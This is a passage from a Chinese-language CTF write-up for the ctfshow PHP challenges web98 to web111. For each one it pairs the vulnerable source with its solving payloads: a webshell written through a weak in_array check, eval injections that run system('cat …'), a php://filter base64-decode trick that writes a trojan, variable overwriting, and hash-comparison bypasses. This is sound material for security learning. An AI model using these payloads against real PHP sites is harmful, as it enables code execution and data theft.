class="number">14</span><span class="meta">%</span>E<span class="number">8</span>jk<span class="number">5</span><span class="meta">%</span><span class="number">0</span>DK<span class="meta">%</span>DAa<span class="meta">%</span>FC<span class="meta">%</span><span class="number">2</span>B<span class="meta">%</span><span class="number">5</span>C<span class="meta">%</span>A<span class="number">0</span><span class="meta">%</span><span class="number">95</span>ab<span class="meta">%</span>D<span class="number">2</span><span class="meta">%</span><span class="number">09</span>P<span class="meta">%</span>A<span class="number">1</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">12</span><span class="meta">%</span><span class="number">3</span>B<span class="meta">%</span><span class="number">1</span>ET<span class="meta">%</span>DA<span class="meta">%</span>AA<span class="meta">%</span><span class="number">92</span><span class="meta">%</span><span class="number">16</span>y<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>CC<span class="meta">%</span><span class="number">7</span>DV<span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span>FF<span class="meta">%</span>B<span class="number">8</span>e<span class="meta">%</span><span class="number">7</span>FK<span class="meta">%</span>D<span class="number">6</span><span class="meta">%</span>CD<span class="meta">%</span><span class="number">1</span>D<span class="meta">%</span>DF/a<span class="meta">%</span>DE<span class="meta">%</span><span class="number">27</span><span class="meta">%</span><span class="number">29</span>o<span class="meta">%</span><span class="number">08</span><span class="meta">%</span>FC<span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span>D<span class="number">1</span><span class="meta">%</span><span class="number">1</span>B<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>C<span class="number">1</span>LYy<span class="meta">%</span>B<span class="number">2</span><span class="meta">%</span>F<span class="number">9</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span>DF<span class="meta">%</span>E<span class="number">2</span><span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span><span class="number">9</span>E<span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">04</span>c<span class="meta">%</span>B<span class="number">1</span><span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span>AFj<span class="meta">%</span><span class="number">9</span>E<span class="meta">%</span><span class="number">7</span>Bh<span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span><span class="number">96</span><span class="meta">%</span>A<span class="number">7</span><span class="meta">%</span>E<span class="number">5</span>U<span class="meta">%</span>EB<span class="symbol">n1</span>q<span class="meta">%</span>CA<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span><span class="number">0</span>B<span class="meta">%</span>C<span class="number">7</span><span class="meta">%</span><span class="number">1</span>BSP</span></span><br></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?1=1</span><br><span class="line">POST：HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>in_array()函数在没有第三个值得时候会进行弱比较，也就是存在强制转换，即1.php此时会被转换为1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?n=1.php</span><br><span class="line">POST：content=&lt;?php system(&#x27;tac flag36d.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>&amp;&amp; &gt; || &gt; = &gt; and &gt; or</code>，&#x3D;的运算符比and高，对于v0的值只需要看v1就可以v2,v3是干扰（<code>0x2d</code>换成<code>-</code>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v2=system(&#x27;cat ctfshow.php&#x27;)/*&amp;v3=*/;</span><br><span class="line">/?v1=1&amp;v2=print_r($ctfshow)/*&amp;v3=*/;</span><br><span class="line"></span><br><span class="line">/?v1=1&amp;v2=echo new ReflectionClass(&#x27;ctfshow&#x27;)/*&amp;v3=*/;</span><br><span class="line">/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反射类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境是php7,所以要另换方法。用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串。</p></blockquote><p>构造出木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">//PD89YGNhdCAqYDs=</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;PD89YGNhdCAqYDs&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$c</span>);  <span class="comment">//5044383959474e6864434171594473</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题目中<code>sub_str</code>前面两个字符不读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">POST:v1=hex2bin</span><br></pre></td></tr></table></figure><p>访问<code>1.php</code>并查看源码即可</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数组绕过或者<code>0e</code>开头</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v2[]=2</span><br><span class="line">POST:v1[]=1</span><br><span class="line"></span><br><span class="line">/?v2=aaroZmOk</span><br><span class="line">POST:v1=aaK1STfY</span><br></pre></td></tr></table></figure><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量覆盖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?tmp=flag</span><br><span class="line">POST:error=tmp</span><br><span class="line"></span><br><span class="line">/?suces=flag&amp;flag=</span><br></pre></td></tr></table></figure><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v2[]=2</span><br><span class="line">POST:v1[]=1</span><br><span class="line"></span><br><span class="line">/?v2=aaroZmOk</span><br><span class="line">POST:v1=aaK1STfY</span><br></pre></td></tr></table></figure><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v3[]=1</span><br><span class="line">POST:v1[flag][]=1</span><br><span class="line"></span><br><span class="line">/?v3=QNKCDZO</span><br><span class="line">POST:v1=flag=0</span><br></pre></td></tr></table></figure><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>%00</code>截断即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=a%00778</span><br></pre></td></tr></table></figure><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>寻找一些可用的PHP原生内酯类，echo会使得<code>$v1</code>类触发<code>__toString()</code>，传递的参数v2则会被输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=CachingIterator&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br><span class="line">/?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用FilesystemIterator文件系统迭代器，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><p>然后直接访问<code>fl36dga.txt</code>即可</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error 